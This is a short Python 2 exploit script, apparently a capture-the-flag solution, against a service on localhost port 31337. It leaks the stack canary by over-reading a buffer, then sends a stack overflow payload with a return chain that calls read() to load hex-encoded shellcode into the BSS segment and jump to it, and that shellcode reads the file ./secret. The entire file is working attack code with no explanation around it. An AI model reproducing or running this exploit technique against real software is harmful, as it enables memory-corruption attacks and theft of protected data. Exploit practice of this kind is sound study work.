#!python
from struct import pack, unpack
from socket import *
import os
import sys

# cat ./secret
sc = '6a01fe0c246863726574682e2f736589e331c96a0558cd809589eb6a035899b23089e1cd8085c07e0e6a055b89c26a045889e1cd80ebe2'.decode('hex')
SYSTEM = 0xb7e4b260
READ   = 0xb7eea890
BSS    = 0x0804a068

def p32(p):
    return pack('<I', p)

def u32(p):
    return unpack('<I', p)[0]


while 1:
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('localhost', 31337))
    print s.recv(19)
    s.send('A'*16 + '\n')
    rv = s.recv(1540)
    canary = u32('\x00' + rv[17:20])
    if canary:
        print "Canary: %s" % (hex(canary))
        break
    else:
        print "Couldn't get a canary. Try again.."
    s.close()


s = socket(AF_INET, SOCK_STREAM)
s.connect(('localhost', 31337))
print s.recv(19)
p  = 'A' * 16
p += p32(canary)
p += 'BBBBCCCCDDDD' # dummy
p += p32(READ)
p += p32(BSS)
p += p32(0x5)
p += p32(BSS)
p += p32(len(sc))

s.send(p + '\n')
rv = s.recv(68)
s.send(sc + '\n')
print s.recv(1540)
